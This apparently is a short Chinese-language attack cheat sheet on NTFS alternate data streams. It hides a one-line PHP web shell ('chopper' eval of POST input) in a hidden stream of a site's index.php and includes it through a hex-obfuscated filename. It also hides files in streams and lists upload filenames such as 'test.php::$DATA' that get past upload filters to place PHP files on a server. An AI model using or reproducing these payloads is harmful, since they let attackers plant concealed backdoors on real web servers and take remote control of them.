	指定宿主文件，index.php是网页正常文件
	>echo ^<?php @eval($_POST['chopper']);?^> > index.php:hidden.jpg
	<?php include(‘index.php:hidden.jpg’)?>
	<?php 
	$a="696E6465782E7068703"."A68696464656E2E6A7067";#hex编码
	$b="a";
	include(PACK('H*',$$b))
	?>
	>echo 9527 > 1.txt:flag.txt
	>notepad 1.txt:flag.txt
	或不指定宿主文件
	>echo hide > :key.txt
	>cd ../
	>notepad test:key.txt
	上传处绕过
|上传的文件名   |服务器表面现象   |生成的文件内容   |
| ------------ | ------------ | ------------ |
|test.php:a.jpg   |生成test.php   |空   |
|test.php::$DATA   | 生成test.php  |<?php phpinfo();?>   |
|test.php::$INDEX_ALLOCATION   |生成test.php文件夹   |\   |
|test.php::$DATA\0.jpg   |生成0.jpg   |<?php phpinfo();?>   |